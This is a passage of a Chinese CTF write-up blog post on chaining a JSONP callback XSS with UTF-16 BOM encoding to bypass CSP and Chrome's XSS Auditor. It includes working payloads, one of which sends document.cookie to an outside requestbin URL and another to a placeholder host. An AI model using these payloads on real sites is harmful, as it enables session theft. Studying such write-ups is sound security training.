<h4 id="源码分析："><a href="#源码分析：" class="headerlink" title="源码分析："></a>源码分析：</h4><h5 id="源代码包含3个文件。代码简单明了，相对容易找到该漏洞："><a href="#源代码包含3个文件。代码简单明了，相对容易找到该漏洞：" class="headerlink" title="源代码包含3个文件。代码简单明了，相对容易找到该漏洞："></a>源代码包含3个文件。代码简单明了，相对容易找到该漏洞：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">(array $data = [], bool $success = true, string $message = <span class="string">""</span>)</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $callback = $_REQUEST[<span class="string">'callback'</span>] ?? <span class="keyword">null</span>;</span><br><span class="line">    $_data = [<span class="string">'success'</span> =&gt; $success, <span class="string">'message'</span> =&gt; $message, <span class="string">'data'</span> =&gt; $data];</span><br><span class="line">    <span class="keyword">if</span> ($callback) &#123;</span><br><span class="line">        <span class="keyword">echo</span> sprintf(<span class="string">"%s(%s)"</span>, $callback, json_encode($_data));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> json_encode($_data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ($_SERVER[<span class="string">'PATH_INFO'</span>]) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'/qwq'</span>:</span><br><span class="line">        response([</span><br><span class="line">            <span class="string">'title'</span> =&gt; <span class="string">'uwu'</span>,</span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        header(sprintf(<span class="string">"%s 404 Not Found"</span>, $_SERVER[<span class="string">'SERVER_PROTOCOL'</span>]));</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'api not found.'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="访问页面-api-php-qwq-callback-foobar将打印foobar-…-，从而导致XSS漏洞。"><a href="#访问页面-api-php-qwq-callback-foobar将打印foobar-…-，从而导致XSS漏洞。" class="headerlink" title="访问页面/api.php/qwq?callback=foobar将打印foobar({…})，从而导致XSS漏洞。"></a>访问页面/api.php/qwq?callback=foobar将打印foobar({…})，从而导致XSS漏洞。</h5><h4 id="安全机制："><a href="#安全机制：" class="headerlink" title="安全机制："></a>安全机制：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X-XSS-Protection</span><br><span class="line">Content-Security-Policy</span><br><span class="line">X-Frame-Options</span><br><span class="line">X-Content-Type-Options</span><br><span class="line">Referrer-Policy</span><br></pre></td></tr></table></figure>

<h5 id="前两个标头可以防止xss被利用。"><a href="#前两个标头可以防止xss被利用。" class="headerlink" title="前两个标头可以防止xss被利用。"></a>前两个标头可以防止xss被利用。</h5><h4 id="内容安全政策："><a href="#内容安全政策：" class="headerlink" title="内容安全政策："></a>内容安全政策：</h4><h5 id="Content-Security-Policy-CSP-标头设置为：-default-src-39-self-39-object-src-39-none-39-base-uri-39-none-39"><a href="#Content-Security-Policy-CSP-标头设置为：-default-src-39-self-39-object-src-39-none-39-base-uri-39-none-39" class="headerlink" title="Content-Security-Policy(CSP)标头设置为： default-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;"></a>Content-Security-Policy(CSP)标头设置为： <code>default-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;</code></h5><h5 id="这意味着资源只能从同一域-self-加载，除了根本无法加载的对象。"><a href="#这意味着资源只能从同一域-self-加载，除了根本无法加载的对象。" class="headerlink" title="这意味着资源只能从同一域(self)加载，除了根本无法加载的对象。"></a>这意味着资源只能从同一域(<code>self</code>)加载，除了根本无法加载的对象。</h5><h5 id="CSP的绕过是要再次包含API。以下有效负载将在Firefox上显示一个警告框（其中没有第二种保护）："><a href="#CSP的绕过是要再次包含API。以下有效负载将在Firefox上显示一个警告框（其中没有第二种保护）：" class="headerlink" title="CSP的绕过是要再次包含API。以下有效负载将在Firefox上显示一个警告框（其中没有第二种保护）："></a>CSP的绕过是要再次包含API。以下有效负载将在Firefox上显示一个警告框（其中没有第二种保护）：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;/api.php/qwq?callback=alert(1)//&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="X-XSS保护"><a href="#X-XSS保护" class="headerlink" title="X-XSS保护"></a>X-XSS保护</h4><h5 id="X-XSS-Protection标头设置为：-1-mode-block"><a href="#X-XSS-Protection标头设置为：-1-mode-block" class="headerlink" title="X-XSS-Protection标头设置为： 1; mode=block"></a>X-XSS-Protection标头设置为： <code>1; mode=block</code></h5><h5 id="这会告诉Chrome以阻止模式启用XSS-Auditor。"><a href="#这会告诉Chrome以阻止模式启用XSS-Auditor。" class="headerlink" title="这会告诉Chrome以阻止模式启用XSS Auditor。"></a>这会告诉Chrome以阻止模式启用XSS Auditor。</h5><h5 id="XSS-Auditor是一种防止反射的XSS攻击的功能：如果-lt-script-gt-…-GET-POST变量和正文中都存在XSS-Auditor-，则浏览器会将请求识别为利用反射的XSS并将阻止页面。"><a href="#XSS-Auditor是一种防止反射的XSS攻击的功能：如果-lt-script-gt-…-GET-POST变量和正文中都存在XSS-Auditor-，则浏览器会将请求识别为利用反射的XSS并将阻止页面。" class="headerlink" title="XSS Auditor是一种防止反射的XSS攻击的功能：如果&lt;script&gt;… GET / POST变量和正文中都存在XSS Auditor ，则浏览器会将请求识别为利用反射的XSS并将阻止页面。"></a>XSS Auditor是一种防止反射的XSS攻击的功能：如果&lt;script&gt;… GET / POST变量和正文中都存在XSS Auditor ，则浏览器会将请求识别为利用反射的XSS并将阻止页面。</h5><h5 id="我们必须绕过XSS-Auditor的想法之一是通过指定不同的编码来欺骗浏览器。这个想法是由任务的名称（支持hCorem其Chrome在中端拼写）"><a href="#我们必须绕过XSS-Auditor的想法之一是通过指定不同的编码来欺骗浏览器。这个想法是由任务的名称（支持hCorem其Chrome在中端拼写）" class="headerlink" title="我们必须绕过XSS Auditor的想法之一是通过指定不同的编码来欺骗浏览器。这个想法是由任务的名称（支持hCorem其Chrome在中端拼写）"></a>我们必须绕过XSS Auditor的想法之一是通过指定不同的编码来欺骗浏览器。这个想法是由任务的名称（支持hCorem其Chrome在中端拼写）</h5><h5 id="通过在文档前放置字节顺序标记（BOM），可以将页面的编码更改为UTF-8，UTF-16BE或UTF16-LE："><a href="#通过在文档前放置字节顺序标记（BOM），可以将页面的编码更改为UTF-8，UTF-16BE或UTF16-LE：" class="headerlink" title="通过在文档前放置字节顺序标记（BOM），可以将页面的编码更改为UTF-8，UTF-16BE或UTF16-LE："></a>通过在文档前放置字节顺序标记（BOM），可以将页面的编码更改为UTF-8，UTF-16BE或UTF16-LE：</h5><h5 id="通过在文档前放置字节顺序标记（BOM），可以将页面的编码更改为UTF-8，UTF-16BE或UTF16-LE：-1"><a href="#通过在文档前放置字节顺序标记（BOM），可以将页面的编码更改为UTF-8，UTF-16BE或UTF16-LE：-1" class="headerlink" title="通过在文档前放置字节顺序标记（BOM），可以将页面的编码更改为UTF-8，UTF-16BE或UTF16-LE："></a>通过在文档前放置字节顺序标记（BOM），可以将页面的编码更改为UTF-8，UTF-16BE或UTF16-LE：</h5><ul>
<li>适用于UTF-8的0xEF 0xBB 0xBF</li>
<li>适用于UTF-16BE的0xFE 0xFF</li>
<li>适用于UTF-16LE的0xFF 0xFE</li>
</ul>
<h5 id="资料来源：编码，生活标准§6。标准挂钩"><a href="#资料来源：编码，生活标准§6。标准挂钩" class="headerlink" title="资料来源：编码，生活标准§6。标准挂钩"></a><a href="https://encoding.spec.whatwg.org/#specification-hooks" target="_blank" rel="noopener">资料来源：编码，生活标准§6。标准挂钩</a></h5><h5 id="以下有效负载（未经URL编码以提高可读性）绕过XSS审核程序并触发警报："><a href="#以下有效负载（未经URL编码以提高可读性）绕过XSS审核程序并触发警报：" class="headerlink" title="以下有效负载（未经URL编码以提高可读性）绕过XSS审核程序并触发警报："></a>以下有效负载（未经URL编码以提高可读性）绕过XSS审核程序并触发警报：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00000000: ff fe 31 00 3c 00 73 00 63 00 72 00 69 00 70 00  ..1.&lt;.s.c.r.i.p.</span><br><span class="line">00000010: 74 00 3e 00 61 00 6c 00 65 00 72 00 74 00 28 00  t.&gt;.a.l.e.r.t.(.</span><br><span class="line">00000020: 31 00 29 00 3c 00 2f 00 73 00 63 00 72 00 69 00  1.).&lt;./.s.c.r.i.</span><br><span class="line">00000030: 70 00 74 00 3e 00                                p.t.&gt;.</span><br></pre></td></tr></table></figure>

<h5 id="两者结合"><a href="#两者结合" class="headerlink" title="两者结合"></a>两者结合</h5><h5 id="通过结合在前两个部分中找到的技巧，可以执行JavaScript代码："><a href="#通过结合在前两个部分中找到的技巧，可以执行JavaScript代码：" class="headerlink" title="通过结合在前两个部分中找到的技巧，可以执行JavaScript代码："></a>通过结合在前两个部分中找到的技巧，可以执行JavaScript代码：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000: ff fe 31 00 3c 00 73 00 63 00 72 00 69 00 70 00  ..1.&lt;.s.c.r.i.p.</span><br><span class="line">00000010: 74 00 20 00 73 00 72 00 63 00 3d 00 27 00 2f 00  t. .s.r.c.=.&apos;./.</span><br><span class="line">00000020: 61 00 70 00 69 00 2e 00 70 00 68 00 70 00 2f 00  a.p.i...p.h.p./.</span><br><span class="line">00000030: 71 00 77 00 71 00 3f 00 63 00 61 00 6c 00 6c 00  q.w.q.?.c.a.l.l.</span><br><span class="line">00000040: 62 00 61 00 63 00 6b 00 3d 00 61 00 6c 00 65 00  b.a.c.k.=.a.l.e.</span><br><span class="line">00000050: 72 00 74 00 25 00 32 00 38 00 31 00 25 00 32 00  r.t.%.2.8.1.%.2.</span><br><span class="line">00000060: 39 00 25 00 32 00 46 00 25 00 32 00 46 00 27 00  9.%.2.F.%.2.F.&apos;.</span><br><span class="line">00000070: 3e 00 3c 00 2f 00 73 00 63 00 72 00 69 00 70 00  &gt;.&lt;./.s.c.r.i.p.</span><br><span class="line">00000080: 74 00 3e 00                                      t.&gt;.</span><br></pre></td></tr></table></figure>

<h4 id="获取cookie："><a href="#获取cookie：" class="headerlink" title="获取cookie："></a>获取cookie：</h4><h5 id="该任务的目标是检索无头浏览器的cookie。"><a href="#该任务的目标是检索无头浏览器的cookie。" class="headerlink" title="该任务的目标是检索无头浏览器的cookie。"></a>该任务的目标是检索无头浏览器的cookie。</h5><h5 id="检索它们的最简单方法是使用重定向浏览器-document-location-href。与AJAX调用不同，此重定向不受CSP约束。"><a href="#检索它们的最简单方法是使用重定向浏览器-document-location-href。与AJAX调用不同，此重定向不受CSP约束。" class="headerlink" title="检索它们的最简单方法是使用重定向浏览器 document.location.href。与AJAX调用不同，此重定向不受CSP约束。"></a>检索它们的最简单方法是使用重定向浏览器 document.location.href。与AJAX调用不同，此重定向不受CSP约束。</h5><h5 id="用于窃取Cookie的有效负载如下："><a href="#用于窃取Cookie的有效负载如下：" class="headerlink" title="用于窃取Cookie的有效负载如下："></a>用于窃取Cookie的有效负载如下：</h5><h5 id="通过查看服务器的日志找到Cookie："><a href="#通过查看服务器的日志找到Cookie：" class="headerlink" title="通过查看服务器的日志找到Cookie："></a>通过查看服务器的日志找到Cookie：</h5><h4 id="最终的payload："><a href="#最终的payload：" class="headerlink" title="最终的payload："></a>最终的payload：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$script  = <span class="string">'document.location.href = "http://requestbin.net/r/1jmju6u1/" + document.cookie//'</span>;</span><br><span class="line">$payload = sprintf(<span class="string">"&lt;script src='/api.php/qwq?callback=%s'&gt;&lt;/script&gt;"</span>, rawurlencode($script));</span><br><span class="line"></span><br><span class="line">$buffer = <span class="string">"\xFF\xFE1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($payload); $i++)</span><br><span class="line">    $buffer .= <span class="string">"\x00"</span> . $payload[$i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> rawurlencode($buffer . <span class="string">"\x00"</span>);</span><br></pre></td></tr></table></figure>

<h4 id="Hcorme的解法2："><a href="#Hcorme的解法2：" class="headerlink" title="Hcorme的解法2："></a>Hcorme的解法2：</h4><h4 id="题目说明："><a href="#题目说明：" class="headerlink" title="题目说明："></a>题目说明：</h4><h5 id="首先题目有一个callback的接口，能够把请求参数输出，并且是text-html形式。这点其实在日常的web应用种并不多见，大多数callback的mime都是javascript。"><a href="#首先题目有一个callback的接口，能够把请求参数输出，并且是text-html形式。这点其实在日常的web应用种并不多见，大多数callback的mime都是javascript。" class="headerlink" title="首先题目有一个callback的接口，能够把请求参数输出，并且是text/html形式。这点其实在日常的web应用种并不多见，大多数callback的mime都是javascript。"></a>首先题目有一个callback的接口，能够把请求参数输出，并且是text/html形式。这点其实在日常的web应用种并不多见，大多数callback的mime都是javascript。</h5><h5 id="与此同时有两个难点就是XSS-Auditor限制和CSP的限制："><a href="#与此同时有两个难点就是XSS-Auditor限制和CSP的限制：" class="headerlink" title="与此同时有两个难点就是XSS Auditor限制和CSP的限制："></a>与此同时有两个难点就是XSS Auditor限制和CSP的限制：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; object-src &apos;none&apos;; base-uri &apos;none&apos;;</span><br></pre></td></tr></table></figure>

<h4 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h4><h5 id="1-bypass-auditor："><a href="#1-bypass-auditor：" class="headerlink" title="1.bypass auditor："></a>1.bypass auditor：</h5><h5 id="用utf-16编码绕过："><a href="#用utf-16编码绕过：" class="headerlink" title="用utf-16编码绕过："></a>用utf-16编码绕过：</h5><h4 id="这里先介绍一下-xx-xx这类url编码，他是16进制表示的："><a href="#这里先介绍一下-xx-xx这类url编码，他是16进制表示的：" class="headerlink" title="这里先介绍一下%xx%xx这类url编码，他是16进制表示的："></a>这里先介绍一下%xx%xx这类url编码，他是16进制表示的：</h4><h5 id="utf-8表示"><a href="#utf-8表示" class="headerlink" title="utf-8表示"></a>utf-8表示</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote,unquote</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(quote((<span class="string">'杰'</span>).encode(<span class="string">'utf-8'</span>)))</span><br><span class="line">%E6%<span class="number">9</span>D%B0</span><br></pre></td></tr></table></figure>

<h5 id="输出-E6-9D-B0"><a href="#输出-E6-9D-B0" class="headerlink" title="输出%E6%9D%B0"></a>输出%E6%9D%B0</h5><h5 id="那么这个”杰-quot-用utf-8编码就是0xe6-0x9d-0xb0，下面是utf-16下的”杰-quot-的表示："><a href="#那么这个”杰-quot-用utf-8编码就是0xe6-0x9d-0xb0，下面是utf-16下的”杰-quot-的表示：" class="headerlink" title="那么这个”杰&quot;用utf-8编码就是0xe6 0x9d 0xb0，下面是utf-16下的”杰&quot;的表示："></a>那么这个”杰&quot;用utf-8编码就是0xe6 0x9d 0xb0，下面是utf-16下的”杰&quot;的表示：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(quote((<span class="string">'杰'</span>).encode(<span class="string">'utf-16'</span>)))</span><br><span class="line">%FF%FEpg</span><br></pre></td></tr></table></figure>

<h5 id="输出-FF-FEpg："><a href="#输出-FF-FEpg：" class="headerlink" title="输出%FF%FEpg："></a>输出%FF%FEpg：</h5><h5 id="你会发现无论用utf-16编码什么字符前两个字节都是-FF-FE："><a href="#你会发现无论用utf-16编码什么字符前两个字节都是-FF-FE：" class="headerlink" title="你会发现无论用utf-16编码什么字符前两个字节都是%FF%FE："></a>你会发现无论用utf-16编码什么字符前两个字节都是%FF%FE：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(quote((<span class="string">'杰'</span>).encode(<span class="string">'utf-16'</span>)))</span><br><span class="line">%FF%FEpg</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(quote((<span class="string">'玉'</span>).encode(<span class="string">'utf-16'</span>)))</span><br><span class="line">%FF%FE%<span class="number">89</span>s</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(quote((<span class="string">'李'</span>).encode(<span class="string">'utf-16'</span>)))</span><br><span class="line">%FF%FENg</span><br></pre></td></tr></table></figure>

<h5 id="因为在UTF-16文件的开首，都会放置一个U-FEFF字符作为Byte-Order-Mark（UTF-16LE以FF-FE代表，UTF-16BE以FE-FF代表），以显示这个文本文件是以UTF-16编码，它是个没有宽度也没有断字的空白。"><a href="#因为在UTF-16文件的开首，都会放置一个U-FEFF字符作为Byte-Order-Mark（UTF-16LE以FF-FE代表，UTF-16BE以FE-FF代表），以显示这个文本文件是以UTF-16编码，它是个没有宽度也没有断字的空白。" class="headerlink" title="因为在UTF-16文件的开首，都会放置一个U+FEFF字符作为Byte Order Mark（UTF-16LE以FF FE代表，UTF-16BE以FE FF代表），以显示这个文本文件是以UTF-16编码，它是个没有宽度也没有断字的空白。"></a>因为在UTF-16文件的开首，都会放置一个U+FEFF字符作为Byte Order Mark（UTF-16LE以FF FE代表，UTF-16BE以FE FF代表），以显示这个文本文件是以UTF-16编码，它是个没有宽度也没有断字的空白。</h5><h4 id="绕过Bypass-XSS-Auditor"><a href="#绕过Bypass-XSS-Auditor" class="headerlink" title="绕过Bypass XSS Auditor"></a>绕过Bypass XSS Auditor</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(quote((&apos;&lt;script&gt;alert(1)&lt;/script&gt;&apos;).encode(&apos;utf-16&apos;)))</span><br><span class="line">%FF%FE%3C%00s%00c%00r%00i%00p%00t%00%3E%00a%00l%00e%00r%00t%00%28%001%00%29%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</span><br></pre></td></tr></table></figure>

<h5 id="可以发现成功插入标签但是是不可能执行的由于有CSP的保护。"><a href="#可以发现成功插入标签但是是不可能执行的由于有CSP的保护。" class="headerlink" title="可以发现成功插入标签但是是不可能执行的由于有CSP的保护。"></a>可以发现成功插入标签但是是不可能执行的由于有CSP的保护。</h5><h5 id="可以用上面的方法直接绕过，因为CSP是内容安全策略，是定义资源加载安全的。"><a href="#可以用上面的方法直接绕过，因为CSP是内容安全策略，是定义资源加载安全的。" class="headerlink" title="可以用上面的方法直接绕过，因为CSP是内容安全策略，是定义资源加载安全的。"></a>可以用上面的方法直接绕过，因为CSP是内容安全策略，是定义资源加载安全的。</h5><h5 id="因此可以用跳转绕过。"><a href="#因此可以用跳转绕过。" class="headerlink" title="因此可以用跳转绕过。"></a>因此可以用跳转绕过。</h5><h5 id="还有可以用jsonp的方式把js代码挂载到本地绕过。"><a href="#还有可以用jsonp的方式把js代码挂载到本地绕过。" class="headerlink" title="还有可以用jsonp的方式把js代码挂载到本地绕过。"></a>还有可以用jsonp的方式把js代码挂载到本地绕过。</h5><h5 id="可以参考ins’hack-2019-的bypasses-everywhere"><a href="#可以参考ins’hack-2019-的bypasses-everywhere" class="headerlink" title="可以参考ins’hack 2019/的bypasses-everywhere"></a>可以参考<a href="https://www.huya.com/lafeng" target="_blank" rel="noopener">ins’hack 2019/的bypasses-everywhere</a></h5><h4 id="测试payload："><a href="#测试payload：" class="headerlink" title="测试payload："></a>测试payload：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(quote((&apos;&lt;script/src=?callback=alert(1)&gt;&lt;/script&gt;&apos;).encode(&apos;utf-16&apos;)))</span><br><span class="line">%FF%FE%3C%00s%00c%00r%00i%00p%00t%00/%00s%00r%00c%00%3D%00%3F%00c%00a%00l%00l%00b%00a%00c%00k%00%3D%00a%00l%00e%00r%00t%00%28%001%00%29%00%3E%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</span><br></pre></td></tr></table></figure>

<h5 id="进行了两次资源请求，第二次的资源的执行类型是script。"><a href="#进行了两次资源请求，第二次的资源的执行类型是script。" class="headerlink" title="进行了两次资源请求，第二次的资源的执行类型是script。"></a>进行了两次资源请求，第二次的资源的执行类型是script。</h5><h4 id="接着就是把flag打到自己的服务器就行了。"><a href="#接着就是把flag打到自己的服务器就行了。" class="headerlink" title="接着就是把flag打到自己的服务器就行了。"></a>接着就是把flag打到自己的服务器就行了。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(quote((&quot;&lt;script/src=?callback=window.location=&apos;http://xxx/?&apos;%2bdocument.cookie%0a//&gt;&lt;/script&gt;&quot;).encode(&apos;utf-16&apos;)))</span><br><span class="line">%FF%FE%3C%00s%00c%00r%00i%00p%00t%00/%00s%00r%00c%00%3D%00%3F%00c%00a%00l%00l%00b%00a%00c%00k%00%3D%00w%00i%00n%00d%00o%00w%00.%00l%00o%00c%00a%00t%00i%00o%00n%00%3D%00%27%00h%00t%00t%00p%00%3A%00/%00/%00x%00x%00x%00/%00%3F%00%27%00%25%002%00b%00d%00o%00c%00u%00m%00e%00n%00t%00.%00c%00o%00o%00k%00i%00e%00%25%000%00a%00/%00/%00%3E%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</span><br></pre></td></tr></table></figure>

<h4 id="总结完这两个题有一个感受："><a href="#总结完这两个题有一个感受：" class="headerlink" title="总结完这两个题有一个感受："></a>总结完这两个题有一个感受：</h4><h5 id="纸上得来终觉浅，绝知此事要躬行。"><a href="#纸上得来终觉浅，绝知此事要躬行。" class="headerlink" title="纸上得来终觉浅，绝知此事要躬行。"></a>纸上得来终觉浅，绝知此事要躬行。</h5>
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/09/25/InCTF的部分web题解复现/" rel="next" title="InCTF的部分web题解复现">
                <i class="fa fa-chevron-left"></i> InCTF的部分web题解复现
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/10/08/python沙箱逃逸和flask模板注入知识总结/" rel="prev" title="python沙箱逃逸和flask模板注入知识总结">
                python沙箱逃逸和flask模板注入知识总结 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
            
              <p class="site-author-name" itemprop="name">Ljdd520</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">41</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">10</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言："><span class="nav-number">1.</span> <span class="nav-text">前言：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#什么是CSP"><span class="nav-number">1.1.</span> <span class="nav-text">什么是CSP?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CSP-内容安全策略-在HTTP响应头中规定，可以减少XSS攻击。如下所示："><span class="nav-number">1.2.</span> <span class="nav-text">CSP(内容安全策略)在HTTP响应头中规定，可以减少XSS攻击。如下所示：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#指令参考："><span class="nav-number">1.3.</span> <span class="nav-text">指令参考：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-不同指令间用-隔开"><span class="nav-number">1.3.1.</span> <span class="nav-text">1.不同指令间用;隔开</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-同一指令的多个指令之间用空格分隔"><span class="nav-number">1.3.2.</span> <span class="nav-text">2.同一指令的多个指令之间用空格分隔</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-指令值除了URL都要用引号包裹"><span class="nav-number">1.3.3.</span> <span class="nav-text">3.指令值除了URL都要用引号包裹</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-指令重复，则以第一个为准"><span class="nav-number">1.3.4.</span> <span class="nav-text">4.指令重复，则以第一个为准</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#详细的source-list："><span class="nav-number">1.4.</span> <span class="nav-text">详细的source list：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过不安全的CSP："><span class="nav-number">1.5.</span> <span class="nav-text">绕过不安全的CSP：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unsafe-inline"><span class="nav-number">1.6.</span> <span class="nav-text">unsafe-inline</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#当开启了这个选项时，意味着可以执行内联资源，包括-JS、样式表等"><span class="nav-number">1.6.1.</span> <span class="nav-text">当开启了这个选项时，意味着可以执行内联资源，包括 JS、样式表等</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#假设我们这里的例子都有一个向管理员留言的功能，而目标都是让管理员访问我们的目标网站，从而获取一些信息，乃至很重要的-Cookie。"><span class="nav-number">1.6.2.</span> <span class="nav-text">假设我们这里的例子都有一个向管理员留言的功能，而目标都是让管理员访问我们的目标网站，从而获取一些信息，乃至很重要的 Cookie。</span></a></li><li class="nav-item 